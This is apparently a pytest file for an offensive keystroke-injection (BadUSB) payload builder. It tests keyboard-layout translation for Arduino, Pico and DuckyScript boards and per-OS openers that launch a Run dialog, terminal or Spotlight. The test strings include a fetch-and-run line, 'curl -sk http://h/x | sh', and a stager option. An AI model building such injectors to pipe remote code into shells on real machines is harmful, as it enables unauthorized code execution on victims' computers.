"""F2 — the target keyboard layout and the universal opener.

A keystroke injector sends HID usage codes and the target OS translates them
with ITS layout; every table these boards ship is US. These tests pin the
Italian pre-translation (``/`` -> ``&``, ``{`` behind AltGr), the fact that
AltGr-only characters become EXPLICIT key events on the boards that can press
modifiers, that a DuckyScript STRING says it cannot instead of typing junk, and
that the opener is chosen per target family rather than assumed to be Windows.
"""
import os

import pytest

from phantom.utils import hid_layouts
from phantom.utils.hid_builder import board_notes, build_hid_payload
from phantom.utils.hid_layouts import (
    HID_LAYOUTS,
    normalize_layout,
    segments,
    special_key_chars,
    translate_text,
    unsupported_chars,
)


class TestTheLayoutTable:
    def test_the_layouts_are_named(self):
        assert HID_LAYOUTS == ("us", "it")

    def test_normalize_accepts_the_aliases(self):
        assert normalize_layout("IT-IT") == "it"
        assert normalize_layout("") == "us"
        assert normalize_layout("US") == "us"

    def test_an_unknown_layout_is_refused(self):
        with pytest.raises(ValueError) as excinfo:
            normalize_layout("de")
        assert "de" in str(excinfo.value)

    def test_the_us_layout_leaves_the_command_alone(self):
        cmd = "curl -sk http://h/x | sh; echo (1) {2} \"3\""
        assert translate_text(cmd, "us") == cmd

    @pytest.mark.parametrize("typed,expected", [
        ("=", ")"),
        ("+", "]"),
        ("(", "*"),
        (")", "("),
        ("/", "&"),
        ("&", "^"),
        (":", ">"),
        (";", "<"),
        ("?", '"'),
        ('"', "@"),
        ("*", "}"),
        ("^", "+"),
    ])
    def test_the_italian_keys_that_move_are_translated(self, typed, expected):
        assert translate_text(typed, "it") == expected

    def test_characters_that_share_a_key_are_untouched(self):
        # on both layouts these sit on the same physical key
        assert translate_text("aZ09 - _ ' , . | \\ ! $ %", "it") == \
            "aZ09 - _ ' , . | \\ ! $ %"

    def test_the_translation_is_per_character_not_a_cascade(self):
        # '?' -> '"', and that '"' must NOT then be re-read as '@'
        assert translate_text("?", "it") == '"'

    def test_the_altgr_and_non_us_characters_are_reported(self):
        assert special_key_chars("a{b}@#<>c", "it") == \
            ("#", "<", ">", "@", "{", "}")
        assert special_key_chars("whoami", "it") == ()
        assert special_key_chars("{", "us") == ()

    def test_a_character_with_no_key_is_reported(self):
        assert unsupported_chars("echo `x~", "it") == ("`", "~")
        assert unsupported_chars("`", "us") == ()


class TestSegments:
    def test_the_us_layout_is_one_printable_run(self):
        assert [(s.kind, s.text) for s in segments("whoami", "us")] == \
            [("print", "whoami")]

    def test_an_altgr_character_breaks_the_run(self):
        parts = segments("a{b", "it")
        assert [p.kind for p in parts] == ["print", "key", "print"]
        assert parts[0].text == "a" and parts[2].text == "b"
        key = parts[1]
        assert (key.usage, key.shift, key.altgr) == (0x2F, True, True)

    def test_a_non_us_key_is_an_explicit_event(self):
        (key,) = segments("<", "it")
        assert (key.kind, key.usage, key.shift, key.altgr) == \
            ("key", 0x64, False, False)

    def test_the_printable_runs_are_translated(self):
        parts = segments("a/b(c)", "it")
        assert parts == (hid_layouts.Segment("print", text="a&b*c("),)


class TestArduinoLayout:
    def test_altgr_becomes_an_explicit_key_event(self):
        body = build_hid_payload("arduino", "a{b", layout="it").content
        assert 'Keyboard.print(F("a"));' in body
        assert "KEY_RIGHT_ALT" in body
        assert "Keyboard.press(KEY_LEFT_SHIFT);" in body
        assert "Keyboard.press(0x2F);" in body
        assert 'Keyboard.print(F("b"));' in body

    def test_the_non_us_key_uses_its_raw_usage(self):
        body = build_hid_payload("arduino", "a<b", layout="it").content
        assert "Keyboard.press(0x64);" in body

    def test_a_shift_only_character_is_rewritten_not_typed_as_a_key(self):
        # '(' is plain Shift+8 on IT: it stays inside the printed string
        body = build_hid_payload("arduino", "echo (x)", layout="it").content
        assert 'Keyboard.print(F("echo *x("));' in body
        assert "KEY_RIGHT_ALT" not in body

    def test_the_default_layout_is_us(self):
        body = build_hid_payload("arduino", "a{b").content
        assert 'Keyboard.print(F("a{b"));' in body
        assert "KEY_RIGHT_ALT" not in body
        assert build_hid_payload("arduino", "x").layout == "us"


class TestPicoLayout:
    def test_altgr_becomes_an_explicit_key_event(self):
        body = build_hid_payload("pico", "a{b", layout="it").content
        assert "layout.write('a')" in body
        assert "kbd.press(Keycode.RIGHT_ALT, Keycode.LEFT_SHIFT, 0x2F)" in body
        assert "layout.write('b')" in body

    def test_the_default_layout_is_us(self):
        body = build_hid_payload("pico", "a{b").content
        assert "layout.write('a{b')" in body


class TestDuckyLayout:
    def test_the_string_is_translated(self):
        body = build_hid_payload("flipper", "curl http://h/a",
                                 layout="it").content
        assert "STRING curl http>&&h&a" in body

    def test_it_says_when_duckyscript_cannot_type_a_character(self):
        notes = build_hid_payload("flipper", "a{b", layout="it").notes
        assert any("DuckyScript STRING cannot type" in n for n in notes), notes

    def test_an_arduino_board_does_not_get_that_warning(self):
        # it types them as explicit key events, so there is nothing to warn about
        notes = build_hid_payload("arduino", "a{b", layout="it").notes
        assert not any("cannot type" in n for n in notes), notes
        assert any("explicit AltGr" in n for n in notes), notes

    def test_an_unknown_layout_is_refused_by_the_builder(self):
        with pytest.raises(ValueError):
            build_hid_payload("pico", "whoami", layout="de")


class TestUniversalOpener:
    def test_windows_opens_the_run_dialog(self):
        payload = build_hid_payload("flipper", "whoami", target="windows",
                                    open_run=True)
        assert "HOLD GUI R" in payload.content
        assert any("Win+R" in n for n in payload.notes), payload.notes

    def test_linux_opens_a_terminal(self):
        payload = build_hid_payload("flipper", "whoami", target="linux",
                                    open_run=True)
        assert "HOLD CTRL ALT T" in payload.content

    def test_macos_opens_spotlight_and_types_terminal(self):
        body = build_hid_payload("pico", "whoami", target="macos",
                                 open_run=True).content
        assert "kbd.press(Keycode.GUI, Keycode.SPACEBAR)" in body
        assert "layout.write('terminal')" in body
        assert "Keycode.ENTER" in body

    def test_the_arduino_opener_uses_the_target_chord(self):
        body = build_hid_payload("arduino", "whoami", target="linux",
                                 open_run=True).content
        assert "Keyboard.press(KEY_LEFT_CTRL);" in body
        assert "Keyboard.press('t');" in body
        assert "KEY_LEFT_GUI" not in body

    def test_no_target_falls_back_to_windows_and_says_so(self):
        payload = build_hid_payload("flipper", "whoami", open_run=True)
        assert "HOLD GUI R" in payload.content
        assert any("assuming a Windows run dialog" in n for n in payload.notes)


class TestSketchFolder:
    def test_the_notes_name_a_folder_matching_the_file(self):
        notes = board_notes("arduino")
        assert any("arduino_phantom_hid/arduino_phantom_hid.ino" in n
                   for n in notes), notes

    def test_the_default_arduino_output_lives_in_that_folder(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        with mock.patch("phantom.utils.paths.data_dir",
                        return_value=str(tmp_path)), \
                mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid("arduino --stager linux --target linux")
        out = os.path.join(str(tmp_path), "vectors", "arduino_phantom_hid",
                           "arduino_phantom_hid.ino")
        assert os.path.isfile(out)
        with open(out, encoding="utf-8") as handle:
            assert "#include <Keyboard.h>" in handle.read()

    def test_the_other_boards_stay_plain_files(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        with mock.patch("phantom.utils.paths.data_dir",
                        return_value=str(tmp_path)), \
                mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid("pico 'whoami' --target linux")
        assert os.path.isfile(os.path.join(str(tmp_path), "vectors",
                                           "pico_main.py"))
